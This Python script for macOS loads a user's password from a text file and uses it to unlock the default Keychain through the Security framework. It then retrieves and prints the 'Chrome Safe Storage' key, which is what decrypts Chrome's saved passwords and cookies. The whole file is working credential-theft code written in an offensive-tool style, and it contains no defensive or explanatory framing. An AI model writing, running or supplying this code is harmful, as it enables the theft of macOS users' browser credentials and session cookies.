import ctypes
from ctypes import cdll, c_void_p, c_uint32, byref
import ctypes.util
import time

# Load password from file
with open("userpass.txt", "r") as f:
    user_pass = f.read().strip().encode("utf-8")

# Load libraries
cf = cdll.LoadLibrary(ctypes.util.find_library("CoreFoundation"))
sec = cdll.LoadLibrary(ctypes.util.find_library("Security"))

# Constants
kSecClass = c_void_p.in_dll(sec, "kSecClass")
kSecClassGenericPassword = c_void_p.in_dll(sec, "kSecClassGenericPassword")
kSecAttrService = c_void_p.in_dll(sec, "kSecAttrService")
kSecReturnData = c_void_p.in_dll(sec, "kSecReturnData")
kSecMatchLimit = c_void_p.in_dll(sec, "kSecMatchLimit")
kSecMatchLimitOne = c_void_p.in_dll(sec, "kSecMatchLimitOne")
kCFTypeDictionaryKeyCallBacks = c_void_p.in_dll(cf, "kCFTypeDictionaryKeyCallBacks")
kCFTypeDictionaryValueCallBacks = c_void_p.in_dll(cf, "kCFTypeDictionaryValueCallBacks")
kCFBooleanTrue = c_void_p.in_dll(cf, "kCFBooleanTrue")

cf.CFStringCreateWithCString.argtypes = [c_void_p, ctypes.c_char_p, c_uint32]
cf.CFStringCreateWithCString.restype = c_void_p
cf.CFDictionaryCreate.restype = c_void_p
cf.CFDataGetLength.argtypes = [c_void_p]
cf.CFDataGetLength.restype = ctypes.c_long
cf.CFDataGetBytePtr.restype = ctypes.POINTER(ctypes.c_ubyte)
cf.CFDataGetBytePtr.argtypes = [c_void_p]
cf.CFRelease.argtypes = [c_void_p]
cf.CFGetTypeID.argtypes = [c_void_p]
cf.CFGetTypeID.restype = ctypes.c_ulong
cf.CFDataGetTypeID.restype = ctypes.c_ulong

sec.SecKeychainCopyDefault.argtypes = [ctypes.POINTER(c_void_p)]
sec.SecKeychainUnlock.argtypes = [c_void_p, ctypes.c_uint32, ctypes.c_void_p, ctypes.c_bool]
sec.SecItemCopyMatching.argtypes = [c_void_p, ctypes.POINTER(c_void_p)]
sec.SecItemCopyMatching.restype = ctypes.c_int32

def cfstr(s):
    return cf.CFStringCreateWithCString(None, s.encode(), 0x08000100)

def create_query_dict(kv):
    keys = (c_void_p * len(kv))()
    values = (c_void_p * len(kv))()
    for i, (k, v) in enumerate(kv.items()):
        keys[i] = c_void_p(k)
        if isinstance(v, str):
            values[i] = cfstr(v)
        elif isinstance(v, bool):
            values[i] = kCFBooleanTrue if v else c_void_p(0)
        elif isinstance(v, c_void_p):
            values[i] = v
        else:
            values[i] = c_void_p(v)
    return cf.CFDictionaryCreate(None, keys, values, len(kv),
                                 kCFTypeDictionaryKeyCallBacks,
                                 kCFTypeDictionaryValueCallBacks)

def unlock_keychain(password_bytes):
    kc = c_void_p()
    status = sec.SecKeychainCopyDefault(byref(kc))
    if status != 0:
        raise Exception(f"[!] SecKeychainCopyDefault failed: OSStatus {status}")
    unlock_status = sec.SecKeychainUnlock(kc, len(password_bytes), password_bytes, True)
    if unlock_status != 0:
        raise Exception(f"[!] SecKeychainUnlock failed: OSStatus {unlock_status}")
    print("[+] Keychain unlocked successfully")
    return kc

def get_chrome_password():
    query = create_query_dict({
        kSecClass.value: kSecClassGenericPassword,
        kSecAttrService.value: "Chrome Safe Storage",
        kSecReturnData.value: kCFBooleanTrue,
        kSecMatchLimit.value: kSecMatchLimitOne,
    })

    result = c_void_p()
    status = sec.SecItemCopyMatching(query, byref(result))
    if status != 0:
        raise Exception(f"[!] SecItemCopyMatching failed: OSStatus {status}")
    if not result:
        raise Exception("[!] SecItemCopyMatching returned NULL")

    result_type = cf.CFGetTypeID(result)
    expected_type = cf.CFDataGetTypeID()
    if result_type != expected_type:
        raise Exception(f"[!] Unexpected type returned. Got {result_type}, expected CFData {expected_type}")

    length = cf.CFDataGetLength(result)
    data_ptr = cf.CFDataGetBytePtr(result)
    data = bytes(data_ptr[:length])
    cf.CFRelease(result)
    return data.decode("utf-8")

if __name__ == "__main__":
    try:
        unlock_keychain(user_pass)
        time.sleep(0.5)
        pw = get_chrome_password()
        print(f"[+] Chrome Safe Storage password: {pw}")
    except Exception as e:
        print(f"[-] {e}")
